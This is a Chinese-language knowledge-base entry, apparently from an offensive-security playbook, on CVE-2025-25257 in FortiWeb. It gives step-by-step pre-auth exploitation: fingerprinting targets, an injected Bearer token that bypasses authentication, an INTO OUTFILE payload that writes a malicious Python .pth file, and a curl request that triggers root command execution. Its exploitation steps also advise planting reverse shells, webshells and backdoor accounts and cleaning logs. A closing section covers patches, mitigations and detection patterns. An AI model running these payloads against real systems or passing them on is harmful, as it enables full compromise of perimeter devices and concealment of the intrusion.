---
id: web-generic-sqli-fortiweb-fabric-bearer-outfile-pth-rce
title: FortiWeb Fabric Connector 预认证 SQL 注入：Bearer token 注入 MySQL INTO OUTFILE 写 .pth 触发 root RCE（CVE-2025-25257）
type: scenario
domain: web
path: web/generic/sqli
technique: fortiweb-fabric-connector-bearer-sqli-outfile-pth-rce
tags:
- sqli
- fortiweb
- fortinet
- pre-auth
- outfile
- python-pth
- rce
- waf
- cve
cve:
- CVE-2025-25257
severity: critical
confidence: medium
affected_versions: FortiWeb 7.0.0-7.0.10、7.2.0-7.2.10、7.4.0-7.4.7、7.6.0-7.6.3；修复版本 7.0.11/7.2.11/7.4.8/7.6.4
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V198
  verified_at: '2026-11-06T22:36:44+08:00'
  notes: 已对照原文核对：CVE-2025-25257、版本区间7.0.0-7.0.10/7.2.0-7.2.10/7.4.0-7.4.7/7.6.0-7.6.3、修复7.0.11/7.2.11/7.4.8/7.6.4、128字符限制、/**/绕过、INTO OUTFILE写.pth、/cgi-bin/ml-draw.py触发均与原文一致；PoC为原文概念性示例未实际复现
url: /docs/web/generic/sqli/web-generic-sqli-fortiweb-fabric-bearer-outfile-pth-rce/
draft: false
kb_aliases:
- CVE-2025-25257
- FortiWeb SQL 注入
- Fabric Connector SQLi
- get_fabric_user_by_token
- INTO OUTFILE .pth
- ml-draw.py
- FG-IR-25-151
---

## 一句话结论

FortiWeb 的 Fabric Connector 在 `get_fabric_user_by_token()` 中把 `Authorization: Bearer <token>` 直接 `snprintf` 拼进 MySQL 查询，预认证攻击者可用 `aaa'/**/or/**/'1'='1` 绕过认证，再用 `UNION SELECT '<Python 代码>' INTO OUTFILE '../../usr/local/lib/python3.10/site-packages/x.pth'` 写入恶意 `.pth`；访问 `/cgi-bin/ml-draw.py` 等 Python CGI 时，`site` 模块会自动执行 `.pth` 中以 `import` 开头的行，从而以 root 权限执行任意命令。

## 原理

- **入口与拼接**：`/api/fabric/device/status`、`/api/fabric/authenticate` 等 Fabric Connector 路由从 `Authorization` 头取 Bearer token；旧版 `get_fabric_user_by_token()` 用 `snprintf("SELECT ... FROM fabric_user.user_table WHERE token='%s' AND status='active'", token)` 拼接，没有参数化、没有转义、没有字符校验。请求在认证前就进入该查询，因此是预认证 SQL 注入。
- **长度与过滤约束**：解析用 `sscanf("Bearer %128s")` 之类的写法把 token 限制在 128 字符左右；空白可能被过滤。用 MySQL 块注释 `/**/` 代替空格（如 `aaa'/**/or/**/'1'='1`），并尽量压缩 SQL 与文件路径，才能塞进长度限制。
- **认证绕过**：闭合 `token='...'` 的字符串后用 `or '1'='1` 使 WHERE 恒真；查询返回任意有效行后 `authenticate_user()` 被调用，攻击者获得 Fabric 认证上下文。也可用 UNION/报错注入读数据，但最终目标是文件写入。
- **INTO OUTFILE 写文件**：FortiWeb 的 MySQL 用户通常具有 FILE 权限，且服务以 root 运行；`SELECT '<content>' INTO OUTFILE '<path>'` 可把内容写到磁盘。目标文件不能已存在；`secure_file_priv` 若未限制则可写到任意可写目录，受限时可选择 `site-packages` 或 Web 目录。
- **Python .pth 劫持**：Python 启动时 `site` 模块扫描 `site-packages` 下的 `.pth` 文件，遇到以 `import ` 开头的行会直接 `exec`。把内容写成 `import os;os.system('id')` 的 `.pth` 放到 `/usr/local/lib/python3.10/site-packages/`，任何启动 Python 解释器的操作都会执行它。
- **触发执行**：FortiWeb 内置 Python CGI（报告点名 `/cgi-bin/ml-draw.py`）；访问该脚本会让 CGI 处理器启动 Python，`site` 初始化时加载恶意 `.pth`。定时任务、管理操作调用 Python 也可触发。
- **root 权限**：`httpsd`、MySQL 与 Python CGI 以 root 运行，因此 `.pth` 中的命令继承 root 权限，攻击者获得设备完全控制。
- **为什么成立**：三个设计缺陷叠加——预认证 SQL 拼接、数据库 FILE 权限过大、Python `.pth` 自动执行且进程高权限；任一环节被限制（参数化、`secure_file_priv`、非 root/容器隔离）都会削弱链条。

## 触发条件

- 目标为受影响版本的 FortiWeb（7.0.0-7.0.10、7.2.0-7.2.10、7.4.0-7.4.7、7.6.0-7.6.3），Fabric Connector API 可从攻击者网络访问。
- 未应用 FG-IR-25-151 补丁，或未通过禁用管理接口/阻断 `/api/fabric/*` 做临时缓解。
- MySQL 用户具有 FILE 权限（默认常见），目标目录可写，`secure_file_priv` 未限制到不可用路径。
- 存在可触发的 Python 解释器启动点（如 `/cgi-bin/ml-draw.py`、定时任务或管理操作）。
- 攻击者能构造 128 字符以内的注入 payload，并知道/猜测 site-packages 路径（Python 3.10 常见路径）。

## 利用步骤

1. 用 FOFA/Censys/Shodan 指纹或直接访问管理端口识别 FortiWeb，确认版本在受影响区间；正常访问 `/api/fabric/device/status` 应返回 401。
2. 发送 `Authorization: Bearer test'`，观察是否出现 SQL 错误、500 或与正常 401 不同的响应，确认注入点。
3. 发送 `Authorization: Bearer aaa'/**/or/**/'1'='1`，若返回 200/设备状态信息，说明认证绕过成功。
4. 在 128 字符限制内构造 `UNION SELECT ... INTO OUTFILE`：内容为一行 Python（如 `import os;os.system('id')`），路径用相对路径或最短的 site-packages 路径（如 `../../lib/python3.10/site-packages/a.pth`）；避免空格，用 `/**/`；目标文件必须不存在（可换文件名）。
5. 访问 `/cgi-bin/ml-draw.py`（或其他会启动 Python 的 CGI/定时任务），触发 `site` 加载 `.pth`；用 `id`、`whoami`、DNSLog/回连确认命令执行。
6. 成功后写入反向 shell/webshell/后门账户，读取 FortiWeb 配置、证书与后端流量；注意清理 `.pth` 和日志。
7. 若 `INTO OUTFILE` 被 `secure_file_priv` 阻断，尝试其他可写路径/其他 MySQL 写文件原语，或改用 SQL 注入读取凭据后登录管理后台。

## PoC

> 报告中的代码为伪代码重构、payload 为概念性示例，且 `sscanf` 限制约 128 字符；下列 UNION 示例可能超长，实际需按目标路径与命令压缩/调整。未在本机复现。

```http
### 1) 注入点/认证绕过测试
GET /api/fabric/device/status HTTP/1.1
Host: target-fortiweb
Authorization: Bearer aaa'/**/or/**/'1'='1
```

```http
### 2) 概念性 INTO OUTFILE 写 .pth（需压缩到长度限制内）
GET /api/fabric/device/status HTTP/1.1
Host: target-fortiweb
Authorization: Bearer aaa'/**/UNION/**/SELECT/**/'import os;os.system("id")'/**/INTO/**/OUTFILE/**/'../../lib/python3.10/site-packages/a.pth'/**/--/**
```

```bash
### 3) 触发 Python site 初始化
curl -k "https://target-fortiweb/cgi-bin/ml-draw.py"
```

```python
# 写入 site-packages 的 .pth 内容（示例）
import os;os.system('id')
```

## 变体与关联

- 变体：若空格过滤严格，使用 `/**/`、`%09`、`%0a` 等替代；若 `--` 需要后跟空格，改用 `/* */` 或布尔条件收尾。
- 变体：`INTO OUTFILE` 被 `secure_file_priv` 限制时，可尝试写 Web 目录/CGI 目录，或利用其他 MySQL 文件写原语；也可先用 SQLi 读取管理员凭据再登录。
- 变体：Python 触发点不限于 `/cgi-bin/ml-draw.py`；报告中还提到定时任务和管理操作调用 Python，实际需枚举 CGI/计划任务。
- 关联：[[web-generic-sqli-mysql-outfile-general-log-webshell]]（MySQL OUTFILE/日志写 webshell 的通用手法）、[[web-python-upload-traversal-pth-sitepackages-rce]] 与 [[web-python-sandbox-site-packages-pth-sitecustomize-escape]]（`.pth`/site-packages 代码执行机制）。
- 关联：[[web-generic-sqli-error-based-extraction]]（SQL 报错取数，可作为注入确认与数据读取的补充）。

## 检测与防御

- **补丁**：升级到 FortiWeb 7.0.11、7.2.11、7.4.8、7.6.4 或更高（FG-IR-25-151）；CISA KEV 已收录，应按紧急漏洞处理。
- **临时缓解**：禁用 HTTP/HTTPS 管理界面或限制管理源 IP；在上游防火墙/反向代理阻断 `/api/fabric/*`；仅允许可信管理网络访问 Fabric Connector。
- **数据库**：撤销 MySQL 用户 FILE 权限，设置 `secure_file_priv` 到专用目录，禁止 `INTO OUTFILE` 写 site-packages/Web 目录。
- **Python**：限制 site-packages 写权限，监控 `.pth` 文件创建/修改；生产环境避免以 root 运行 Python CGI；对 CGI 目录做完整性监控。
- **检测**：Authorization 头中出现 `'`、`/**/`、`union`、`select`、`into`、`outfile`、`site-packages`、`.pth`；`/api/fabric/*` 返回 200 的异常请求；`/cgi-bin/*.py` 异常访问；site-packages 下新增 `.pth` 或含 `import os`/`os.system` 的文件；MySQL 日志/二进制日志中的 `INTO OUTFILE`。
- **响应**：发现可疑 `.pth`/webshell 后隔离设备、取证、轮换凭据、从干净镜像重建；检查是否创建后门账户或修改 WAF 策略。
